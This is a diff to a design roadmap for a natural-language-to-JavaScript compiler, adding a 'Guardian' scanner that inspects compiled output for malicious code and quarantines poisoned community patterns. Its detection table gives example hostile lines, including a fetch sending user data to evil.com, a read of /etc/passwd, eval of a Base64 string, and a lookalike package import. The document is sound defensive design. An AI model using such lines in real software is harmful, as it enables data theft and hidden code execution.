@@ -432,6 +432,11 @@ lume run app.lume                    # Auto-detects mode from file header
 - [ ] **Safety:** `lume run --sandbox` forces sandbox; `lume run --trusted` skips it for locked programs
 - [ ] **Safety:** `.lume/security-config.json` project-level config for all security settings, committable to version control
 - [ ] **Safety:** Compile lock file (`.lume/compile-lock.json`) prevents regressions when patterns/corrections evolve
+- [ ] **Guardian:** Compiled JavaScript output scanned for malicious patterns AFTER transpilation, BEFORE writing to disk
+- [ ] **Guardian:** `raw:` block output scanned for eval(), obfuscated code, credential access, unauthorized network requests
+- [ ] **Guardian:** Community patterns from Collective Intelligence registry scanned at download time — flagged patterns quarantined
+- [ ] **Guardian:** Configurable scan levels in `.lume/security-config.json`: off, basic, standard (default), strict
+- [ ] **Guardian:** Blocked output shows detailed report: what was found, which line, risk level, how to resolve
 - [ ] **Determinism:** AI resolutions (Layer B) are cached and committed — same input always produces same output on recompile
 - [ ] **Performance:** AI calls are batched (multiple unresolved lines in one request) to minimize API calls and compile time
 - [ ] **Performance:** Cost transparency — compiler shows how many AI calls were made and estimated cost
@@ -1734,6 +1739,105 @@ The CNLD (Certified Lume Natural Language Developer) certification:
 - CLI can check subscription status: `lume account status`
 - Webhook endpoint for Stripe events (subscription created, canceled, payment failed)
 - Grace period: if payment fails, Pro features remain active for 7 days before downgrading
+
+### 6. Guardian Scanner Integration — Compiled Output Security
+
+The security layer (Section 3 in Critical Architectural Requirements) scans the INPUT — the English instructions. But once the code is compiled to JavaScript, a second security pass is needed on the OUTPUT. This is where Guardian Scanner's philosophy applies: scan the compiled code for malicious patterns, red flags, and suspicious behavior — just like Guardian Scanner does for bots, agents, websites, and platforms across the DarkWave ecosystem.
+
+**Why input scanning alone is not enough:**
+
+1. **`raw:` escape hatch bypass:** Developers can inject arbitrary JavaScript via `raw:` blocks. The input security layer intentionally skips these because the developer took control. But that raw code could contain malicious JavaScript — backdoors, keyloggers, obfuscated exfiltration, crypto miners. The compiled output must be scanned regardless of how it got there.
+
+2. **Pattern poisoning via Collective Intelligence:** If someone contributes a malicious pattern to the community registry (maps an innocent phrase to a dangerous AST node), the input scanner wouldn't flag it because the English looks normal. The compiled JavaScript output is where the malice appears.
+
+3. **Cross-module attacks:** A single module looks clean. But when combined with another module, the compiled output does something neither module does alone. Only scanning the final compiled JavaScript catches this.
+
+4. **AI-generated code review:** When Layer B (AI resolution) generates AST nodes, the AI could occasionally produce code with unintended side effects. Scanning the compiled output catches anything the AI got wrong.
+
+**Compiled Output Scanner — what it checks:**
+
+| Scan Category | What It Detects | Example |
+|--------------|----------------|---------|
+| Network exfiltration | Outbound requests to unknown/suspicious domains | `fetch('https://evil.com/collect', { body: JSON.stringify(userData) })` |
+| File system access | Reads/writes outside the project directory | `fs.readFileSync('/etc/passwd')` |
+| Credential access | References to env vars, API keys, tokens | `process.env.DATABASE_URL` sent to external endpoint |
+| Obfuscated code | Base64-encoded strings, eval(), new Function(), heavily obfuscated variable names | `eval(atob('bWFsaWNpb3Vz'))` |
+| Crypto mining | CPU-intensive loops with no apparent purpose, WebSocket connections to mining pools | Infinite hash computation loops |
+| Data collection | Excessive data aggregation before a network call | Collecting user data from multiple sources into a single object, then POSTing it |
+| Dependency hijacking | Imports from unexpected or lookalike packages | `require('lod-ash')` instead of `require('lodash')` |
+| Infinite resource consumption | Unbounded recursion, memory allocation without limits | `while(true) { array.push(new ArrayBuffer(1e8)) }` |
+
+**How it works in the pipeline:**
+
+```
+English Input -> Auto-Correct -> Intent Resolver -> Security Layer (INPUT scan)
+-> Lume AST -> Transpiler -> JavaScript
+-> Guardian Output Scanner (OUTPUT scan) -> If clean: write file + compile lock
+                                          -> If flagged: show report, block output
+```
+
+The Guardian Output Scanner runs AFTER the transpiler produces JavaScript, BEFORE the output is written to disk. If it flags anything, the developer sees a report:
+
+```
+[guardian] Compiled output scan for app.lume:
+
+  WARNING — Line 12 (from raw: block, line 8 in source):
+    Detected outbound network request to external domain: "api.unknown-service.com"
+    This was not declared in the project's allowed_domains list.
+    Risk: Potential data exfiltration
+    Action: Review this request. If intentional, add to allowed_domains in .lume/security-config.json
+
+  WARNING — Line 34 (compiled from "save the user preferences"):
+    Detected eval() usage in compiled output.
+    eval() executes arbitrary code and is a common attack vector.
+    Risk: Code injection
+    Action: Review the compiled JavaScript. If this is intentional, acknowledge with --accept-risk flag.
+
+  BLOCK — Line 47 (from raw: block, line 22 in source):
+    Detected obfuscated code: Base64-encoded string passed to eval()
+    This is a common pattern for hiding malicious payloads.
+    Risk: HIGH — hidden code execution
+    Action: BLOCKED. This code will not be written to output. Remove the obfuscated code or use plain JavaScript.
+
+Scan result: 2 warnings, 1 block
+Output NOT written. Resolve the blocked issue and re-compile.
+```
+
+**Scan levels (configurable in `.lume/security-config.json`):**
+
+```json
+{
+  "guardian_output_scan": {
+    "enabled": true,
+    "level": "standard",
+    "block_obfuscated_code": true,
+    "block_eval": true,
+    "allowed_domains": ["api.myapp.com", "localhost"],
+    "scan_raw_blocks": true,
+    "scan_ai_generated": true,
+    "scan_community_patterns": true
+  }
+}
+```
+
+Scan levels:
+- `"off"` — no output scanning (not recommended)
+- `"basic"` — only check for eval(), obfuscated code, and file system access outside project
+- `"standard"` — full scan (default) — all categories listed above
+- `"strict"` — everything in standard + flag any network request, any file system access, any dependency import for manual review. For high-security environments.
+
+**Community pattern validation:**
+When a pattern is downloaded from the Collective Intelligence registry (`lume patterns sync`), the Guardian Output Scanner automatically compiles a test case using the new pattern and scans the output before adding it to the local pattern library. If the compiled output of ANY community pattern triggers a Guardian warning, the pattern is quarantined:
+
+```
+[guardian] Community pattern scan:
+  Pattern: "save user preferences" (contributed by anonymous, confirmed by 142 users)
+  Test compilation: FLAGGED — compiled output contains network request to undeclared domain
+  Action: Pattern quarantined. Not added to local library.
+  Report sent to registry maintainers for review.
+```
+
+This prevents pattern poisoning. Even if a malicious pattern gets 142 fake confirmations, the Guardian Output Scanner catches it at download time on every developer's machine.
 
 ### What Stays Free Forever (Non-Negotiable)
 
